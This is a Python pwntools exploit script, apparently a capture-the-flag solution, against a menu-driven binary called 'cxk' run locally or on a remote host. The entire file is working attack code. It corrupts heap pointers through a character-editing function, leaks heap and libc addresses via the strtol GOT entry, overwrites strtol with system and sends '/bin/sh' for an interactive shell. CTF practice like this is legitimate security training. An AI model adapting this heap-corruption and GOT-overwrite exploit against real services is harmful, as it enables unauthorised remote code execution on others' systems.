from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./cxk")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./cxk")
else:
    p = remote(sys.argv[1],sys.argv[2])
    libc = ELF("./libc.so.6")
    elf = ELF("./cxk")

def menu(choice):
    p.sendlineafter("Choice:",str(choice))

def add_av(number,size,des):
    menu(2)
    menu(1)
    p.sendlineafter("Please input av number:",str(number))
    p.sendlineafter("Please input the size of description:",str(hex(size)[2:]))
    p.sendlineafter("Description:",des)

def edit_av(number,des):
    menu(2)
    menu(2)
    p.sendlineafter("Please input av number:",str(number))
    p.sendlineafter("New Description:",des)

def free_av(number):
    menu(2)
    menu(3)
    p.sendlineafter("Please input av number:",str(number))

def show_av(number):
    menu(2)
    menu(4)
    p.sendlineafter("Please input av number:",str(number))
    p.recvuntil("AV description:")

def add_law(number,size,reason):
    menu(1)
    menu(1)
    p.sendlineafter("Please input av number:",str(number))
    p.sendlineafter("Please input the size of reason:",str(hex(size)[2:]))
    p.sendlineafter("Reason:",reason)

def win_law(number):
    menu(1)
    menu(2)
    p.sendlineafter("Please input av number:",str(number))
    p.recvuntil("You win the case\n")

def edit_law(number,old,new):
    menu(1)
    menu(3)
    p.sendlineafter("Please input the av_number for statement you want to change:",str(number))
    p.sendlineafter("Please input the old character:",str(old))
    p.sendlineafter("Please input the new character:",str(new))

def free_law(number):
    menu(1)
    menu(4)
    p.sendlineafter("Please input the av_number for lawyer letter you want to revoke:",str(number))

def show_law(number):
    menu(1)
    menu(5)
    p.sendlineafter("Please input the av_number for lawyer letter you want to see:",str(number))
    p.recvuntil("Reason:")

def reset():
    menu(3)

def edit_name(name):
    menu(4)
    p.sendline(name)

def init(name):
    p.sendlineafter("Please input your name:",name)

def debugf():
    if debug:
        gdb.attach(p,"b *0x0000000000401CDB\nb *0x00000000004012E2")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
init("a"*0x10)
#debugf()
add_av(0,0x10,"a"*0xf)
add_law(0,0x10,"b"*0xf)
add_av(1,0x10,"c"*0xf)
free_av(1)
free_law(0)
add_av(1,0x20,"d"*0x1f)
add_law(0,0x10,"e"*0xf)
debugf()
for i in range(0x38 - 1):
    edit_law(0,"\x00","d")
#debugf()
show_av(1)
p.recvuntil("1" + "d" * 7)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
log.success("leak_addr:" + hex(leak_addr))
payload = p64(leak_addr)
target = p64(elf.got["strtol"])
for i in range(8):
    edit_law(0,payload[i],target[i])
#debugf()
show_av(1)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["strtol"]
log.success("libc_base:" + hex(libc.address))
debugf()
edit_av(1,p64(libc.symbols["system"]))
menu("/bin/sh")
#debugf()
p.interactive()
